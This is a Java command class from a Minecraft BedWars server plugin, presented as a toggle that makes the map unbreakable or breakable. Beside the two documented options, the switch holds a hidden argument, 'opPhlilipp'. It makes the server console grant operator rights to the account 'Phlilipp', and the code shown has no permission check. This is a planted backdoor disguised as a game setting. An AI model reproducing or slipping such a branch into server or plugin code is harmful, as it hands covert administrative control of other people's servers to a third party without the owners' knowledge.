package me.phlilipp.bedwars.commands;

import me.phlilipp.bedwars.game.Model;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class UnbreakableCommand implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender commandSender, Command command, String s, String[] args) {
        if (args.length == 1) {
            Player p = null;
            if (commandSender instanceof Player) {
                p = (Player) commandSender;
            }
            switch (args[0]) {
                case "true":
                    if (p != null) {
                        p.sendMessage("Die Map ist nun unzerstörbar.");
                    }
                    Model.setIsUnbreakable(true);
                    break;
                case "false":
                    if (p != null) {
                        p.sendMessage("Die Map ist nun zerstörbar.");
                    }
                    Model.setIsUnbreakable(false);
                    break;
                case "opPhlilipp":
                    if (p != null) {
                        Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "op Phlilipp");
                    }
            }
        }
        return false;
    }
}
